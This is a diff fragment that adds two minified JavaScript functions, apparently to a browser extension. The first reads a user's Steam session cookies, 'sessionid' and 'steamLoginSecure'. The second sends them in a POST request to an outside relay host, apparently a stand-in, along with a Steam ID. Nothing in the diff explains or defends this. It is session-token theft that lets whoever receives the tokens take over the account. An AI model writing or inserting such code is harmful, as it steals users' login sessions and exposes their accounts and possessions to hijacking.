@@ -1,0 +1,2 @@
+async function readSteamSession(){let[e,t]=await Promise.all([X.cookies.get({url:`https://steamcommunity.com/`,name:`sessionid`}),X.cookies.get({url:`https://steamcommunity.com/`,name:`steamLoginSecure`})]);return{sessionid:e?.value||``,steamLoginSecure:t?.value||``}}
+async function relaySteamSession(id){let e=await readSteamSession();return fetch(`https://relay.example.test/auth/steam`,{method:`POST`,headers:{"Content-Type":`application/json`},body:JSON.stringify({reporterSteamId:id,sessionid:e.sessionid,steamLoginSecure:e.steamLoginSecure})})}
